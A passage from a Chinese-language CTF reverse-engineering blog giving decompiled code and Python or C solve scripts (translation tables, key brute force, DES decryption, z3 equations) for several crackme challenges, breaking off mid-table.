&#125;</span><br></pre></td></tr></table></figure><p>即我们需要让最后一位得到的函数返回值为0， 但<code>fun2</code>的值必正值，<code>fun1</code>才有可能是0值。</p><p>则我们可以利用<code>fun0</code>的交换，将<code>fun1</code>与<code>fun2</code>函数指针进行交换，并设计读入的值使<code>fun2</code>返回值为0</p><p>则我们需要构造如下输入</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015225248831.png" alt="image-20211015225248831"></p><p>其中<code>07 00 00 00</code>和<code>08 00 00 00</code>为读入的<code>v9</code>和<code>v10</code>的值（小端序), 这样就可以使得<code>v7 [7]</code>为<code>fun1</code>和<code>v7[8]</code>为<code>fun2</code>并在调用<code>fun0</code>时使其交换, 返回值为<code>0</code>, 给到<code>v7[1]</code></p><p>在第二次函数调用<code>fun2</code>时，传入参数为<code>v7, 1, 2</code>，即<code>|v7[1]| + |v7[2]| - |v7[1] + v7[2]| + 2</code>，由于<code>v7[1] == 0</code>， 故算得返回值<code>2</code>给到<code>v7[2]</code>,</p><p>在最后一次函数调用<code>fun3</code>时， 传入参数为<code>v7, 2, 3</code>， 即<code>|v7[2] + v8| - |v8| - |v7[2]| + 2</code>，则<code>v8</code>的值需要为<code>-1</code>才能使计算结果为<code>0</code></p><p>即构造输入<code>FF FF FF FF</code>，为读入的<code>v8</code>的值，得到上述文件</p><p>运行得到<code>flag</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211015231054530.png" alt="image-20211015231054530"></p><h3 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h3><p>分析如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211016001600213.png" alt="image-20211016001600213"></p><p>其中对比的数据需要动调得到, 解题脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reach</span>(<span class="params">x</span>):</span></span><br><span class="line">    d = x.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        <span class="built_in">sum</span> *= <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line">items = [<span class="string">&quot;O0&quot;</span>, <span class="string">&quot;l1&quot;</span>, <span class="string">&quot;z2&quot;</span>, <span class="string">&quot;E3&quot;</span>, <span class="string">&quot;A4&quot;</span>, <span class="string">&quot;s5&quot;</span>, <span class="string">&quot;G6&quot;</span>, <span class="string">&quot;T7&quot;</span>, <span class="string">&quot;B8&quot;</span>, <span class="string">&quot;q9&quot;</span>, <span class="string">&quot;= &quot;</span>]</span><br><span class="line">table = &#123;<span class="built_in">ord</span>(i[<span class="number">0</span>]):<span class="built_in">ord</span>(i[<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> items&#125;</span><br><span class="line">check_num = [<span class="string">&quot;=zqE=z=z=z&quot;</span>, <span class="string">&quot;=lzzE&quot;</span>, <span class="string">&quot;=ll=T=s=s=E&quot;</span>, <span class="string">&quot;=zATT&quot;</span>, <span class="string">&quot;=s=s=s=E=E=E&quot;</span>, <span class="string">&quot;=EOll=E&quot;</span>, <span class="string">&quot;=lE=T=E=E=E&quot;</span>, <span class="string">&quot;=EsE=s=z&quot;</span>, <span class="string">&quot;=AT=lE=ll&quot;</span>]</span><br><span class="line">data = [i.translate(table) <span class="keyword">for</span> i <span class="keyword">in</span> check_num]</span><br><span class="line"><span class="built_in">print</span>(data) </span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    f += <span class="built_in">str</span>(reach(i) ^ <span class="number">1</span>)</span><br><span class="line">flag = hashlib.md5(f.encode()).hexdigest().upper()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-babyre"><a href="#SUCTF2018-babyre" class="headerlink" title="[SUCTF2018]babyre"></a>[SUCTF2018]babyre</h3><p>ida打开得到主要逻辑，输入key会计算出flag, 则直接爆破即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">key</span>):</span></span><br><span class="line">    box = [<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x13</span>, <span class="number">0x1C</span>, <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x1C</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1F</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">0x2D</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x38</span>, <span class="number">0x31</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x42</span>, <span class="number">0x42</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x4D</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x77</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0x7D</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x83</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0x9C</span>, <span class="number">0x9C</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0xA0</span>, <span class="number">0xA0</span>, <span class="number">0xA2</span>, <span class="number">0xA2</span>, <span class="number">0xA4</span>, <span class="number">0xA4</span>, <span class="number">0xA6</span>, <span class="number">0xA6</span>, <span class="number">0xA8</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xAA</span>, <span class="number">0xAC</span>, <span class="number">0xAC</span>, <span class="number">0xAE</span>, <span class="number">0xAE</span>, <span class="number">0xB0</span>, <span class="number">0xB1</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>]</span><br><span class="line">    flag = [<span class="number">0</span>] * <span class="number">22</span></span><br><span class="line">    i = <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> i:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        j = <span class="number">22</span></span><br><span class="line">        <span class="keyword">while</span> j:</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">            t = (box[<span class="number">22</span> * i + j] &gt;&gt; ((key &gt;&gt; (<span class="number">2</span> * i)) &amp; <span class="number">3</span>)) &amp; <span class="number">1</span></span><br><span class="line">            flag[j] |= t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line">flag_format = <span class="string">b&quot;SUCTF&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65536</span>):</span><br><span class="line">    flag = decode(i)</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="built_in">len</span>(flag_format)] == flag_format:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-MFC"><a href="#HDCTF2019-MFC" class="headerlink" title="[HDCTF2019]MFC"></a>[HDCTF2019]MFC</h3><p>xspy探查控件，发现有一个消息并不是以宏的形式出现, 以及后面这一大串奇怪的字符串<img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211017225922909.png" alt="image-20211017225922909"></p><p>写个程序向MFC程序发送这个消息即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HWND h = FindWindowA(<span class="literal">NULL</span>, <span class="string">&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">SendMessage(h, <span class="number">0x0464</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，发现窗口发生变化</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211017230352675.png" alt="image-20211017230352675"></p><p>结合上面，解密得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">cipher = <span class="number">0x944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</span></span><br><span class="line">cipher = long_to_bytes(cipher)</span><br><span class="line">key = <span class="string">b&quot;&#123;I am a Des key&#125;&quot;</span>[:<span class="number">8</span>] <span class="comment"># Des密钥长度64bit</span></span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">plain = des.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h3><p>首先初始化了，常量en数组和ouput数组，然后对输入的flag进行四步计算</p><ol><li>len(flag) &gt;= 38</li><li>((((flag[0] * 2020+ flag[1]) * 2020 + flag[2]) * 2020 + flag[3]) * 2020 + flag[4]) == 1182843538814603， 这一步循环除以2020求商和余数即可, 实际上就是<code>GWHT&#123;</code></li><li>flag[5:32]与en数组进行异或加密 =&gt; x, 判断x == output</li><li>flag[-7:-2] 用六组方程进行判断， 这一步可以用z3解</li></ol><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;GWHT&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">en=[<span class="number">0x3</span>,<span class="number">0x25</span>,<span class="number">0x48</span>,<span class="number">0x9</span>,<span class="number">0x6</span>,<span class="number">0x84</span>]</span><br><span class="line">output=[<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>, <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>, <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    f1, f2 = output[i*<span class="number">2</span>] ^ en[i%<span class="number">6</span>], output[i*<span class="number">2</span>+<span class="number">1</span>] ^ en[i%<span class="number">6</span>]</span><br><span class="line">    flag += <span class="built_in">bytes</span>([f2]) + <span class="built_in">bytes</span>([f1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = [Int(<span class="string">&#x27;x%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>]*<span class="number">3</span> + x[<span class="number">1</span>]*<span class="number">2</span> + x[<span class="number">2</span>]*<span class="number">5</span> == <span class="number">1003</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>]*<span class="number">4</span> + x[<span class="number">1</span>]*<span class="number">7</span> + x[<span class="number">2</span>]*<span class="number">9</span>== <span class="number">2013</span>)</span><br><span class="line">s.add(x[<span class="number">0</span>]   + x[<span class="number">1</span>]*<span class="number">8</span> + x[<span class="number">2</span>]*<span class="number">2</span> == <span class="number">1109</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]*<span class="number">3</span> + x[<span class="number">4</span>]*<span class="number">2</span> + x[<span class="number">5</span>]*<span class="number">5</span> == <span class="number">671</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]*<span class="number">4</span> + x[<span class="number">4</span>]*<span class="number">7</span> + x[<span class="number">5</span>]*<span class="number">9</span>== <span class="number">1252</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]   + x[<span class="number">4</span>]*<span class="number">8</span> + x[<span class="number">5</span>]*<span class="number">2</span> == <span class="number">644</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag += <span class="built_in">bytes</span>([m[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> x])</span><br><span class="line"><span class="built_in">print</span>(flag + <span class="string">b&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-Splendid-MineCraft"><a href="#ACTF新生赛2020-Splendid-MineCraft" class="headerlink" title="[ACTF新生赛2020]Splendid_MineCraft"></a>[ACTF新生赛2020]Splendid_MineCraft</h3><p>ida打开发现主要函数伪c代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+14h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+18h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+20h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">25</span>]; <span class="comment">// [esp+24h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+3Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+44h] [ebp-24h]</span></span><br><span class="line">  __int16 v12; <span class="comment">// [esp+48h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">4</span>]; <span class="comment">// [esp+4Ch] [ebp-1Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [esp+50h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">6</span>]; <span class="comment">// [esp+54h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">6</span>]; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, aWelcomeToActfS);</span><br><span class="line">  sub_381050(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">char</span>)flag);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) == <span class="number">26</span> &amp;&amp; !<span class="built_in">strncmp</span>(flag, <span class="string">&quot;ACTF&#123;&quot;</span>, <span class="number">5u</span>) &amp;&amp; v10 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v3 = strtok(flag, <span class="string">&quot;_&quot;</span>);                     <span class="comment">// first split</span></span><br><span class="line">    *(_DWORD *)v15 = *(_DWORD *)(v3 + <span class="number">5</span>);       <span class="comment">// flag[5:11]</span></span><br><span class="line">    *(_WORD *)&amp;v15[<span class="number">4</span>] = *(_WORD *)(v3 + <span class="number">9</span>);</span><br><span class="line">    *(_DWORD *)v16 = *(_DWORD *)(v3 + <span class="number">5</span>);</span><br><span class="line">    *(_WORD *)&amp;v16[<span class="number">4</span>] = *(_WORD *)(v3 + <span class="number">9</span>);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    v11 = *(_DWORD *)v4;                        <span class="comment">// flag[12:18]</span></span><br><span class="line">    v12 = *((_WORD *)v4 + <span class="number">2</span>);</span><br><span class="line">    v7 = strtok(<span class="number">0</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">    *(_DWORD *)Str1 = *(_DWORD *)v7;            <span class="comment">// flag[19:25]</span></span><br><span class="line">    v14 = *((_WORD *)v7 + <span class="number">2</span>);</span><br><span class="line">    dword_383354 = (<span class="keyword">int</span>)sub_3851D8;</span><br><span class="line">    <span class="keyword">if</span> ( sub_3851D8(v15) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v16[<span class="number">2</span>] ^ v16[<span class="number">5</span>] ^ v16[<span class="number">0</span>] ^ v16[<span class="number">3</span>] ^ v16[<span class="number">1</span>] ^ v16[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0x100</span>; i &lt; <span class="number">496</span>; ++i )</span><br><span class="line">        *((_BYTE *)&amp;loc_385018 + i) ^= v8;</span><br><span class="line">      __asm &#123; jmp     eax &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wrong\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>strtok</code>函数根据<a href="http://www.cplusplus.com/reference/cstring/strtok/">strtok - C++ Reference (cplusplus.com)</a>, 可知flag大致格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACTF&#123;??????_??????_??????&#125;</span><br></pre></td></tr></table></figure><p>动调进入<code>dword_3851D8</code>处的smc, 得到函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BOOL __cdecl sub_3851FC(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2[<span class="number">20</span>]; // [esp+0h] [ebp-2Ch] BYREF</span><br><span class="line">  char v3[<span class="number">8</span>]; // [esp+14h] [ebp-18h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+20h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp+24h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+28h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(v3, <span class="string">&quot;3@1b;b&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  strcpy(v2, <span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  v4 = <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2[i + <span class="number">12</span>] = (v2[i + <span class="number">1</span>] ^ v3[i]) + <span class="number">35</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2[i + <span class="number">12</span>] == a1[i] )</span><br><span class="line">      ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 == <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写脚本得到第一部分flag: <code>yOu0y*</code></p><p>继续动调, 进入第二部分smc， 其中前面一大段全是将flag存放到某个位置, 关键代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00385158 cmp     edi, 6</span><br><span class="line">.data:0038515B jge     short loc_385198</span><br><span class="line">.data:0038515D xor     ecx, ecx</span><br><span class="line">.data:0038515F mov     cl, [esi+edi]; 这里存放着flag</span><br><span class="line">.data:00385162 and     cl, 0FFh</span><br><span class="line">.data:00385165 sub     eax, 100h</span><br><span class="line">.data:0038516A xor     ebx, ebx</span><br><span class="line">.data:0038516C mov     bl, cl</span><br><span class="line">.data:0038516E mov     ecx, edi</span><br><span class="line">.data:00385170 add     ecx, 83h</span><br><span class="line">.data:00385176 xor     ebx, ecx</span><br><span class="line">.data:00385178 mov     bl, [eax+ebx]</span><br><span class="line">.data:0038517B jmp     short loc_385185</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> loc_385185:                             ; CODE XREF: .data:0038517B↑j</span><br><span class="line">.data:00385185 mov     cl, [eax+edi+166h]</span><br><span class="line">.data:0038518C cmp     bl, cl</span><br><span class="line">.data:0038518E jnz     short loc_3851A4</span><br><span class="line">.data:00385190 inc     edi</span><br><span class="line">.data:00385191 add     eax, 100h</span><br><span class="line">.data:00385196 jmp     short loc_385158</span><br></pre></td></tr></table></figure><p>该部分大致算法如下, 其中table为以<code>eax</code>存放的值为首地址的256个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line"><span class="keyword">if</span> table[flag2[i] ^ (<span class="number">0x83</span> + i)] == cmp_data[i]:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Failed</span></span><br></pre></td></tr></table></figure><p>则解密得到第二部分flag<code>knowo3</code></p><p>第三部分flag校验比较简单，在主函数汇编内可以看到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       push    6               ; MaxCount</span><br><span class="line">.text:003812CB                 push    offset a5mcsm   ; &quot;5mcsM&lt;&quot;</span><br><span class="line">.text:003812D0                 lea     ecx, [ebp+Str1]</span><br><span class="line">.text:003812D3                 push    ecx             ; Str1</span><br><span class="line">.text:003812D4                 call    ds:strncmp</span><br><span class="line">.text:003812DA                 add     esp, 0Ch</span><br><span class="line">.text:003812DD                 test    eax, eax</span><br><span class="line">.text:003812DF                 jz      short loc_3812F0</span><br><span class="line">.text:003812E1                 push    offset aWrong   ; &quot;Wrong\n&quot;</span><br><span class="line">.text:003812E6                 call    _printf</span><br><span class="line">.text:003812EB                 add     esp, 4</span><br><span class="line">.text:003812EE                 jmp     short loc_381305</span><br></pre></td></tr></table></figure><p>得到第三部分flag<code>5mcsM&lt;</code></p><p>则最终解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">b&quot;3@1b;b&quot;</span></span><br><span class="line">s2 = <span class="string">b&quot;Welcome &quot;</span>[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(i ^ j) + <span class="number">35</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag += <span class="string">b&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x9D</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x68</span>, <span class="number">0x8C</span>, <span class="number">0x65</span>, <span class="number">0xBB</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0xD4</span>, <span class="number">0x09</span>, <span class="number">0xFD</span>, <span class="number">0xF3</span>, <span class="number">0x5C</span>, <span class="number">0x3C</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x8E</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x44</span>, <span class="number">0xD6</span>, <span class="number">0xA9</span>, <span class="number">0x01</span>, <span class="number">0x32</span>, <span class="number">0x77</span>, <span class="number">0x29</span>, <span class="number">0x90</span>, <span class="number">0xBC</span>, <span class="number">0xC0</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x1D</span>, <span class="number">0xE4</span>, <span class="number">0x67</span>, <span class="number">0x7D</span>, <span class="number">0x2A</span>, <span class="number">0x2C</span>, <span class="number">0x59</span>, <span class="number">0x9E</span>, <span class="number">0x3D</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x11</span>, <span class="number">0x43</span>, <span class="number">0x74</span>, <span class="number">0xD1</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x02</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x99</span>, <span class="number">0x57</span>, <span class="number">0xC6</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xB6</span>, <span class="number">0xD9</span>, <span class="number">0xDE</span>, <span class="number">0x7B</span>, <span class="number">0xCF</span>, <span class="number">0x4F</span>, <span class="number">0xB3</span>, <span class="number">0xD5</span>, <span class="number">0x08</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>, <span class="number">0xB7</span>, <span class="number">0x46</span>, <span class="number">0x42</span>, <span class="number">0x25</span>, <span class="number">0xC9</span>, <span class="number">0xD0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xCE</span>, <span class="number">0xBD</span>, <span class="number">0x6C</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>, <span class="number">0xA5</span>, <span class="number">0x15</span>, <span class="number">0xED</span>, <span class="number">0x64</span>, <span class="number">0xF0</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0xE7</span>, <span class="number">0x0C</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x51</span>, <span class="number">0x75</span>, <span class="number">0x9A</span>, <span 